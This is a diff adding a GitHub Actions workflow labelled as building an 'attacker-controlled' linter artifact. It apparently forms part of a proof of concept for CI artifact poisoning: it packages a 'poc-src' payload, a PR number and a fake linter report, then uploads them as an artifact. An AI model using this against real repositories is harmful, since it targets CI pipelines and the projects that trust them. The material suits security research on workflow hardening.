@@ -1,0 +1,23 @@
+name: Lint
+on:
+  pull_request:
+    branches: [main]
+
+jobs:
+  lint:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v6
+      - name: Build attacker-controlled linter artifact
+        env:
+          PR: ${{ github.event.pull_request.number }}
+        run: |
+          mkdir -p payload
+          cp -r poc-src/. payload/
+          echo "$PR" > payload/pr-number.txt
+          printf 'attacker supplied linter report\n' > payload/linter-report.txt
+      - name: Upload linter report
+        uses: actions/upload-artifact@v7
+        with:
+          name: linter-report
+          path: payload/
